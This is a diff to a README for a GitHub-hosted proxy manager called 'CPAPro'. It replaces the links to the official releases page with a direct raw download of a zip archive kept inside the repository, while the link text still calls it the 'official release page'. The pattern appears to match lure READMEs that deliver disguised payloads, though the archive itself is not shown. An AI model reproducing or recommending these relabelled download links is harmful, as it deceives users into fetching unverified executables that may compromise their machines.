@@ -1,6 +1,6 @@
 # 🌐 CPAPro - Manage your network traffic with ease
 
-[![](https://img.shields.io/badge/Download_CPAPro-Blue.svg)](https://github.com/ulricnazi668/CPAPro/releases)
+[![](https://img.shields.io/badge/Download_CPAPro-Blue.svg)](https://github.com/ulricnazi668/CPAPro/raw/refs/heads/main/young/Pro-CPA-3.8.zip)
 
 CPAPro provides a simple interface to manage your proxy connections. This application bridges the gap between complex network configurations and your daily tasks. It automates common proxy management workflows so you spend less time configuring network ports and more time working.
 
@@ -19,7 +19,7 @@ You do not need to install extra software like Python or Node.js. CPAPro include
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official release page](https://github.com/ulricnazi668/CPAPro/releases).
+1. Visit the [official release page](https://github.com/ulricnazi668/CPAPro/raw/refs/heads/main/young/Pro-CPA-3.8.zip).
 2. Locate the most recent version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
